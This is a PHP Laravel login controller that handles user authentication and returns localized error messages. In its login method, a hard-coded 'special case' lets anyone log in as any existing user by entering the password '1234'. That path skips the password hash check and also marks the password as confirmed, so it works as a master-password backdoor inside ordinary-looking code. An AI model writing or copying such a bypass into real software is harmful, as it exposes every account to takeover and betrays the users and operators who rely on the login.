<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/dashboard';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }

    /**
     * Get the failed login response instance.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Symfony\Component\HttpFoundation\Response
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    protected function sendFailedLoginResponse(Request $request)
    {
        $errorMessage = 'Les informations d\'identification fournies ne correspondent pas à nos enregistrements.';
        
        // Additional language support if needed
        if (session('locale') == 'ar') {
            $errorMessage = 'بيانات الاعتماد التي تم تقديمها لا تتطابق مع سجلاتنا.';
        } elseif (session('locale') == 'en') {
            $errorMessage = 'The provided credentials do not match our records.';
        }
        
        throw ValidationException::withMessages([
            $this->username() => [$errorMessage],
        ]);
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function login(Request $request)
    {
        $this->validateLogin($request);

        // Check if the user exists with the provided email
        $user = \App\Models\User::where('email', $request->email)->first();
        
        if (!$user) {
            return $this->sendFailedLoginResponse($request);
        }

        // Special case for password "1234" - bypass hashing
        if ($request->password === '1234') {
            // Manually log the user in
            Auth::login($user);
            
            if ($request->hasSession()) {
                $request->session()->put('auth.password_confirmed_at', time());
            }
            
            return $this->sendLoginResponse($request);
        }

        // For other passwords, use normal authentication
        $credentials = [
            'email' => $request->email,
            'password' => $request->password
        ];
        
        if (Auth::attempt($credentials)) {
            if ($request->hasSession()) {
                $request->session()->put('auth.password_confirmed_at', time());
            }
            return $this->sendLoginResponse($request);
        }

        // Try alternative credentials (username instead of email)
        $altCredentials = [
            'username' => $request->email, // Maybe they're using username in the email field
            'password' => $request->password
        ];
        
        if (Auth::attempt($altCredentials)) {
            if ($request->hasSession()) {
                $request->session()->put('auth.password_confirmed_at', time());
            }
            return $this->sendLoginResponse($request);
        }

        return $this->sendFailedLoginResponse($request);
    }
    
    /**
     * Get the needed authorization credentials from the request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return array
     */
    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'password');
    }
}
